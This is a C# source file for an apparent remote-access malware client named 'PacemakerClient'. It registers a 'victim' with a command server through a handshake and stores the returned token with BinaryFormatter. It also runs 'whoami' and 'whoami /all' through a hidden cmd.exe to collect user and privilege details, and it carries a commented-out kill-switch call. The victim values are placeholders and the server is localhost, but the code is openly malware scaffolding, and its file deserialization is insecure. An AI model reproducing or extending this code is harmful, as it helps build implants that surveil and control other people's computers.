using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using Newtonsoft.Json;
using PacemakerClient;
using System.Runtime.Serialization.Formatters.Binary;

namespace PacemakerClient_cli
{
    internal class Program
    {
        public static string server_hostname = "http://localhost:3000";
        public static BinaryFormatter bf;
        public static AuthCore authObj;
        static Stream file_stream;

        public async static Task InitialHandshake()
        {
            HttpClient Client = new HttpClient();

            string victimName = "alskdjaldsk";
            string victimAdditionalinfo = "dummy info";


            string jsonData = "{\"victimName\": \"" + victimName + "\", \"victimAdditionalinfo\": \"" + victimAdditionalinfo +"\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var json = await Client.PutAsync(server_hostname + "/core/initialhandshake", content);

            string jsonResponse = "";
            if (json.IsSuccessStatusCode)
            {
                jsonResponse = await json.Content.ReadAsStringAsync();

                authObj = JsonConvert.DeserializeObject<AuthCore>(jsonResponse);

                bf = new BinaryFormatter();
                Stream stream1;
                stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
                bf.Serialize(stream1, authObj);
                stream1.Close();


                Console.WriteLine(authObj.RefreshToken);
                Console.WriteLine(jsonResponse);
            }

            string fullPath = Environment.CurrentDirectory + "\\log.txt";

            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                writer.WriteLine(json.ToString());
                writer.WriteLine(jsonResponse.ToString());
            }

        }

        public static string GetUserInfo(string option)
        {
            string result;

            if (option == "name")
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();

                process.StandardInput.WriteLine("whoami");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();


                result = process.StandardOutput.ReadToEnd();

                Console.WriteLine(result);
                Console.Write("Hit 1");
                return result;
            }
            else
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();

                process.StandardInput.WriteLine("whoami /all");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();


                result = process.StandardOutput.ReadToEnd();

                Console.WriteLine(result);
                Console.Write("Hit 2");
                return result;
            }
        }


       /* public async static Task KillSwitch()
        {
            HttpClient Client = new HttpClient();

            var json = await Client.DeleteAsync(server_hostname + "/core/killswitch");

            Console.WriteLine(json);

            string fullPath = Environment.CurrentDirectory + "\\killed.txt";

            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                writer.WriteLine(json.ToString());
            }

            Console.WriteLine("Killed");

        }*/

        static async Task Main(string[] args)
        {

            if (File.Exists("authObject.dat"))
            {
                try
                {
                    BinaryFormatter bf5 = new BinaryFormatter();                                            ///deserealzing all the survey answer objects into the main 
                    Stream stream2;                                                                         /// Survey answer list...
                    stream2 = File.Open("authObject.dat", FileMode.Open);
                    authObj = (AuthCore)bf5.Deserialize(stream2);                         /// the label will update accordingly....
                    stream2.Close();

                }catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    await InitialHandshake();
                    Console.WriteLine("Finished authenticating");
                }
               
            }
            else
            {
                file_stream = File.Create("authObject.dat");
                file_stream.Close();

                await InitialHandshake();
        
                Console.WriteLine("Finished authenticating");
            }
           
           
            // await KillSwitch();

            Console.WriteLine("Done");
            Console.ReadLine();
        }
    }
}
